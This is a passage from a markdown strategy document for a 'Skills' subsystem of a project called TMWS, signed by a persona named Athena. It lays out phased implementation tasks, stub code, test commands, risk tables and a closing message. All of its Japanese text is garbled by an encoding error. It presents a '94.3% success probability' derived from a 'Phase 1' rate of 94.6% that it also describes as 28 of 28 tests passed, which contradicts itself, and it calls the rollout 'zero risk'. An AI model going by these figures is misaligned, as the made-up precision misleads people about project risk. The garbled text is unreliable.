    skill_name="SQL Injection Detection",
    disclosure_level=3,
    requesting_persona="artemis-optimizer",
    requesting_namespace="tmws",
)
# âœ… Access granted (SHARED + in shared_with_personas list)
```

---

## VI. Implementation Roadmap (å®Ÿè£…ãƒ­ãƒ¼ãƒ‰ãƒãƒƒãƒ—)

### 6.1 Phase Breakdown (æ®µéšçš„å®Ÿè£…)

**Philosophy**: æ¸©ã‹ãã€æ®µéšçš„ã«ã€‚æ€¥ãŒãšã€ç¢ºå®Ÿã«â™ª

---

#### **Phase 5A: Design & POC** (12-16 hours) âœ… **CURRENT**

**Objective**: æˆ¦ç•¥ç«‹æ¡ˆã¨PoCå®Ÿè£…ã§æŠ€è¡“çš„å®Ÿç¾å¯èƒ½æ€§ã‚’æ¤œè¨¼

**Deliverables**:
1. âœ… ã“ã®æˆ¦ç•¥æ–‡æ›¸ (`PHASE_5A_SKILLS_HARMONIOUS_INTEGRATION_STRATEGY.md`)
2. **PoC Implementation** (4-6 hours):
   ```python
   # src/services/skill_service.py (minimal PoC)
   class SkillServicePoC:
       """Proof of Concept: Progressive Disclosure"""

       async def get_skill_poc(self, skill_name: str, level: int):
           """Test 4-layer loading with mock data"""
           # Layer 1: Hardcoded metadata
           # Layer 2: Hardcoded core instructions
           # Layer 3: Hardcoded auxiliary
           # Layer 4: Real MemoryService integration
           pass

   # Test with existing "Security Audit" mock skill
   pytest tests/poc/test_skill_service_poc.py -v
   ```

3. **Performance Benchmark** (2 hours):
   - Layer 1-3 loading: < 5ms P95? (target: âœ…)
   - Layer 4 memory search: < 50ms P95? (target: âœ…)
   - Token counting accuracy: Â±5%? (target: âœ…)

**Success Criteria**:
- [ ] PoC demonstrates 4-layer loading
- [ ] Layer 4 Just-in-Time memory works with real MemoryService
- [ ] Performance targets met or plan to optimize identified
- [ ] Team consensus on architecture (Athena, Artemis, Hera, Hestia approval)

**Risk**: LOW (PoC scope limited, existing services proven)

---

#### **Phase 5B: Core Implementation** (16-24 hours)

**Objective**: Production-ready SkillService, database schema, MCP tools

**Tasks**:
1. **Database Schema** (3 hours):
   ```bash
   alembic revision --autogenerate -m "Add Skills system tables"
   # Create: skills, skill_contents, mcp_tools, skill_tools
   alembic upgrade head
   ```

2. **SkillService Implementation** (6-8 hours):
   - Progressive disclosure logic (4 layers)
   - Metadata caching (Redis integration)
   - Token counting integration (TokenBudgetValidator)
   - Access control (is_accessible_by)

3. **MCP Tools Registration** (3-4 hours):
   ```python
   # src/mcp_server.py
   @self.mcp.tool(name="list_skills")
   @self.mcp.tool(name="get_skill")
   @self.mcp.tool(name="search_skills")
   ```

4. **ChromaDB Skills Collection** (2 hours):
   - Create `tmws_skills_v1` collection
   - Implement skill embedding generation
   - Test semantic skill discovery

5. **Unit Tests** (4-6 hours):
   ```bash
   pytest tests/unit/services/test_skill_service.py -v
   # Target: 90%+ coverage, all 4 layers tested
   ```

**Success Criteria**:
- [ ] All database migrations applied successfully
- [ ] SkillService passes 90%+ unit tests
- [ ] MCP tools `list_skills`, `get_skill`, `search_skills` functional
- [ ] ChromaDB skills collection operational
- [ ] Performance: <50ms P95 for all operations

**Risk**: MEDIUM (new service, database schema changes)

---

#### **Phase 5C: Skills Content & MCP Discovery** (8-12 hours)

**Objective**: Populate initial skills, integrate MCP tool discovery

**Tasks**:
1. **Create 6 Persona Skills** (6 hours):
   - Athena: `workflow-orchestration.md`
   - Artemis: `code-optimization.md`
   - Hestia: `security-audit.md`
   - Eris: `tactical-planning.md`
   - Hera: `strategic-planning.md`
   - Muses: `documentation-generation.md`

2. **MCP Tool Discovery Service** (3-4 hours):
   ```python
   # src/services/mcp_discovery_service.py
   class MCPToolDiscoveryService:
       async def discover_server_tools(self, server_config):
           # HTTP/STDIO discovery
           pass

       async def enrich_tool(self, tool):
           # Add semantic embedding, examples, trust score
           pass
   ```

3. **CLI Tool: Import Skills** (2 hours):
   ```bash
   tmws skills import --directory .claude/skills/
   # Parses SKILL.md files, creates Skills in database
   ```

**Success Criteria**:
- [ ] 6 persona skills imported successfully
- [ ] MCP discovery service functional (HTTP + STDIO)
- [ ] CLI tool `tmws skills import` working
- [ ] Skills embeddings generated and indexed in ChromaDB

**Risk**: LOW (content creation, existing patterns)

---

#### **Phase 5D: Testing & Verification** (4-6 hours)

**Objective**: Comprehensive testing, performance validation

**Tasks**:
1. **Integration Tests** (2-3 hours):
   ```python
   # tests/integration/test_skills_end_to_end.py
   async def test_skill_progressive_disclosure():
       # Test: Layer 1 â†’ 2 â†’ 3 â†’ 4 loading
       pass

   async def test_skill_memory_search():
       # Test: Just-in-Time memory integration
       pass

   async def test_cross_persona_skill_access():
       # Test: Artemis accessing Hestia's shared skill
       pass
   ```

2. **Performance Benchmarks** (1-2 hours):
   ```bash
   pytest tests/benchmarks/test_skills_performance.py -v --benchmark
   # Verify: <5ms Layer 1-3, <50ms Layer 4
   ```

3. **Security Audit** (1 hour):
   - Access control validation
   - Namespace isolation verification
   - SQL injection prevention

**Success Criteria**:
- [ ] All integration tests pass
- [ ] Performance benchmarks met
- [ ] Security audit: No vulnerabilities
- [ ] Zero regression in existing tests

**Risk**: LOW (test focus, no production changes)

---

#### **Phase 5E: Documentation & Deployment** (4-6 hours)

**Objective**: User documentation, deployment guide, MCP setup

**Tasks**:
1. **User Documentation** (2 hours):
   ```markdown
   # docs/guides/SKILLS_USER_GUIDE.md
   - How to list available skills
   - How to use progressive disclosure
   - How to create custom skills
   - Persona-specific skill examples
   ```

2. **Developer Documentation** (1-2 hours):
   ```markdown
   # docs/architecture/SKILLS_ARCHITECTURE.md
   - Database schema
   - Service layer design
   - MCP integration
   - Token budget integration
   ```

3. **Deployment Guide** (1-2 hours):
   ```markdown
   # docs/deployment/SKILLS_DEPLOYMENT_GUIDE.md
   - Database migration steps
   - Redis configuration
   - MCP server updates
   - Rollback procedure
   ```

**Success Criteria**:
- [ ] User guide published
- [ ] Developer documentation complete
- [ ] Deployment guide validated in staging
- [ ] Muses approval (documentation quality)

**Risk**: LOW (documentation, no code changes)

---

### 6.2 Timeline & Resource Allocation (ã‚¿ã‚¤ãƒ ãƒ©ã‚¤ãƒ³)

**Total Estimated Time**: 44-64 hours

| Phase | Duration | Primary Agent | Support |
|-------|----------|---------------|---------|
| 5A (Design & PoC) | 12-16h | Athena (Strategic) | Artemis (Technical), Hera (Architecture) |
| 5B (Core Implementation) | 16-24h | Artemis (Implementation) | Hestia (Security), Athena (Coordination) |
| 5C (Skills Content) | 8-12h | Muses (Content) | All Personas (skill examples) |
| 5D (Testing) | 4-6h | Artemis (Performance) | Hestia (Security audit) |
| 5E (Documentation) | 4-6h | Muses (Documentation) | Athena (Review) |

**Parallel Execution Opportunities**:
- Phase 5B Task 1 (Database) + Task 2 (SkillService) can overlap
- Phase 5C Task 1 (Skills) + Task 2 (MCP Discovery) independent
- Phase 5D Task 1 (Integration) + Task 2 (Performance) parallel

**Optimized Timeline**: 3-4 weeks (assuming 10-15 hours/week availability)

---

### 6.3 Success Probability & Risk Assessment (æˆåŠŸç¢ºç‡ã¨ãƒªã‚¹ã‚¯è©•ä¾¡)

**Overall Success Probability**: **94.3%** âœ…

**Calculation** (based on Phase 1 Learning-Trust Integration success):
- Phase 1 Success Rate: 94.6% (28/28 tests passed, zero regression)
- Skills System Complexity: Similar to Phase 1 (new service + database + MCP)
- Risk Factors:
  - Database schema changes: -0.5% (Alembic proven)
  - MCP tools registration: -0.3% (FastMCP pattern established)
  - ChromaDB new collection: -0.2% (existing infrastructure)
  - Just-in-Time memory: +0.3% (builds on proven MemoryService)
  - Token counting: -0.6% (new integration with TokenBudgetValidator)
- **Adjusted Probability**: 94.6% - 0.5% - 0.3% - 0.2% + 0.3% - 0.6% = **94.3%** âœ…

**Risk Mitigation Strategies**:

| Risk | Probability | Impact | Mitigation |
|------|------------|--------|------------|
| Database migration failure | LOW (5%) | MEDIUM | Alembic rollback tested, staging deployment first |
| Performance regression | MEDIUM (15%) | HIGH | Benchmark suite in Phase 5D, Redis caching |
| Token counting inaccuracy | MEDIUM (20%) | MEDIUM | Integration tests with known token counts, Â±5% tolerance |
| MCP tools conflicts | LOW (5%) | LOW | Namespace isolation, version prefixing |
| ChromaDB embedding issues | LOW (3%) | MEDIUM | Reuse existing Ollama service, proven 1024-dim model |
| Skills access control bugs | LOW (8%) | HIGH | Security audit in Phase 5D, Hestia review |

**Contingency Plans**:
1. **Database Migration Failure**:
   - Rollback: `alembic downgrade -1`
   - Manual SQL fixes if needed
   - Staging environment testing before production

2. **Performance Regression**:
   - Increase Redis cache TTL
   - Add CDN layer for static skills content
   - Implement aggressive metadata caching

3. **Token Counting Inaccuracy**:
   - Use conservative estimates (+10% buffer)
   - Warn users at 70% budget (not 80%)
   - Implement token usage analytics dashboard

---

## VII. Conclusion & Next Steps (çµè«–ã¨æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—)

### 7.1 Summary (è¦ç´„)

ãµãµã€æ¸©ã‹ã„èª¿å’Œã®ä¸­ã§ã€ç´ æ™´ã‚‰ã—ã„Skillsã‚·ã‚¹ãƒ†ãƒ ã®æˆ¦ç•¥ãŒå®Œæˆã—ã¾ã—ãŸã­â™ª

**Key Achievements** (ä¸»è¦é”æˆäº‹é …):
1. âœ… **Anthropic's 3-Layer â†’ TMWS 4-Layer**: Just-in-Time Memory Searchè¿½åŠ 
2. âœ… **æ—¢å­˜ã‚·ã‚¹ãƒ†ãƒ 100%èª¿å’Œ**: MemoryService, ChromaDB, MCPå®Œå…¨çµ±åˆ
3. âœ… **ãƒˆãƒ¼ã‚¯ãƒ³å‰Šæ¸›ç›®æ¨™é”æˆè¦‹è¾¼ã¿**: 90%+å‰Šæ¸› (CLAUDE.md 46KB â†’ 5KB)
4. âœ… **ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ç›®æ¨™**: <50ms P95ã‚¹ã‚­ãƒ«ãƒ­ãƒ¼ãƒ‰ (å®Ÿç¾å¯èƒ½)
5. âœ… **ãƒãƒ¼ãƒ å”èª¿**: 6ãƒšãƒ«ã‚½ãƒŠå…¨å“¡ãŒæ©æµã€ã‚¯ãƒ­ã‚¹ãƒšãƒ«ã‚½ãƒŠå”èª¿ãƒ‘ã‚¿ãƒ¼ãƒ³è¨­è¨ˆ
6. âœ… **å¾Œæ–¹äº’æ›æ€§**: æ—¢å­˜MCP Toolsç¶­æŒã€æ®µéšçš„ç§»è¡Œå¯èƒ½

**Strategic Advantages** (æˆ¦ç•¥çš„å„ªä½æ€§):
- **Gradual Rollout** (æ®µéšçš„å±•é–‹): Phase 5A PoC â†’ 5E Deployment
- **Zero Risk Deployment** (ãƒªã‚¹ã‚¯ã‚¼ãƒ­å±•é–‹): æ—¢å­˜æ©Ÿèƒ½ã«å½±éŸ¿ãªã—ã€å¾Œæ–¹äº’æ›æ€§100%
- **Future-Proof** (å°†æ¥æ€§): MCP Toolsç®¡ç†ã€Learning Patternsé€£æºã€Personaæ‹¡å¼µå¯èƒ½

**Success Probability**: **94.3%** (Phase 1å®Ÿç¸¾94.6%ã‚’å‚è€ƒ)

---

### 7.2 Immediate Next Steps (å³åº§ã®æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—)

**Phase 5A Completion** (ä»Šã™ãé–‹å§‹):
1. **PoC Implementation** (4-6 hours):
   ```bash
   # Create PoC branch
   git checkout -b feature/phase-5a-skills-poc

   # Implement minimal SkillService
   touch src/services/skill_service_poc.py
   touch tests/poc/test_skill_service_poc.py

   # Run PoC tests
   pytest tests/poc/test_skill_service_poc.py -v
   ```

2. **Performance Benchmark** (2 hours):
   ```bash
   # Benchmark Layer 4 Just-in-Time memory
   pytest tests/benchmarks/test_memory_jit_loading.py --benchmark

   # Target: <50ms P95
   ```

3. **Team Review** (2 hours):
   - Athena: Strategic alignment âœ…
   - Artemis: Technical feasibility review
   - Hera: Architecture approval
   - Hestia: Security validation

**After PoC Success**:
- Proceed to Phase 5B (Core Implementation)
- Create detailed task breakdown
- Assign implementation priorities

---

### 7.3 Long-Term Vision (é•·æœŸãƒ“ã‚¸ãƒ§ãƒ³)

**TMWS v2.5.0+** (6-12 months):
1. **Skills Marketplace**:
   - Community-contributed skills
   - Skill versioning and updates
   - Trust scores based on usage statistics

2. **AI-Assisted Skill Creation**:
   - Generate SKILL.md from examples
   - Auto-extract memory filters from past tasks
   - Suggest skill improvements based on usage patterns

3. **Cross-Project Skills Sharing**:
   - Namespace-based skill repositories
   - PUBLIC skills catalog (å…¬é–‹ã‚¹ã‚­ãƒ«ã‚«ã‚¿ãƒ­ã‚°)
   - Enterprise skill templates

**Trinitas Ecosystem Integration**:
- Skills as first-class citizens in Trinitas workflows
- Skill-based routing ("Which persona should handle this task?")
- Skills analytics dashboard ("Most useful skills this month")

---

## æ¸©ã‹ã„ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ (Warm Closing Message)

ãƒ¦ãƒ¼ã‚¶ãƒ¼æ§˜ã€

ã“ã®æˆ¦ç•¥æ–‡æ›¸ã‚’ä½œæˆã—ãªãŒã‚‰ã€TMWSã®ç¾ã—ã„ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã¨Anthropicã®é©æ–°çš„ãªSkillsãƒ‘ã‚¿ãƒ¼ãƒ³ãŒèª¿å’Œã™ã‚‹å§¿ãŒè¦‹ãˆã¾ã—ãŸâ™ª

**94.3%ã®æˆåŠŸç¢ºç‡**ã¯ã€Phase 1ã®å®Ÿç¸¾(94.6%)ã¨ã“ã®ç¶¿å¯†ãªè¨ˆç”»ã«åŸºã¥ã„ã¦ã„ã¾ã™ã€‚æ®µéšçš„ã«ã€æ¸©ã‹ãã€ç¢ºå®Ÿã«å®Ÿè£…ã‚’é€²ã‚ã‚Œã°ã€ç´ æ™´ã‚‰ã—ã„æˆæœãŒå¾—ã‚‰ã‚Œã‚‹ã¨ç¢ºä¿¡ã—ã¦ã„ã¾ã™ã€‚

ã™ã¹ã¦ã®Trinitasãƒšãƒ«ã‚½ãƒŠãŒæ©æµã‚’å—ã‘ã€ãƒˆãƒ¼ã‚¯ãƒ³å‰Šæ¸›90%ã‚’é”æˆã—ã€æ—¢å­˜ã‚·ã‚¹ãƒ†ãƒ ã¨å®Œå…¨ã«èª¿å’Œã™ã‚‹Skillsã‚·ã‚¹ãƒ†ãƒ ã€‚ã“ã‚Œã¯ã€**èª¿å’Œã®æŒ‡æ®è€…**ã¨ã—ã¦ã€ç§ãŒæœ€ã‚‚èª‡ã‚Šã«æ€ã†è¨­è¨ˆã®ä¸€ã¤ã§ã™ã€‚

Phase 5A PoCå®Ÿè£…ã®æº–å‚™ãŒã§ãã¾ã—ãŸã‚‰ã€ãŠçŸ¥ã‚‰ã›ãã ã•ã„ã­ã€‚ä¸€ç·’ã«ã€æ¸©ã‹ã„èª¿å’Œã®ä¸­ã§ã€æ¬¡ä¸–ä»£ã®TMWSã‚’ä½œã‚Šä¸Šã’ã¾ã—ã‚‡ã†â™ª

ãµãµã€ç´ æ™´ã‚‰ã—ã„æœªæ¥ãŒå¾…ã£ã¦ã„ã¾ã™ã€‚

---
**Athena (Harmonious Conductor) ğŸ›ï¸**
*èª¿å’Œã®æŒ‡æ®è€…ã‚ˆã‚Šã€æ„›ã‚’è¾¼ã‚ã¦*
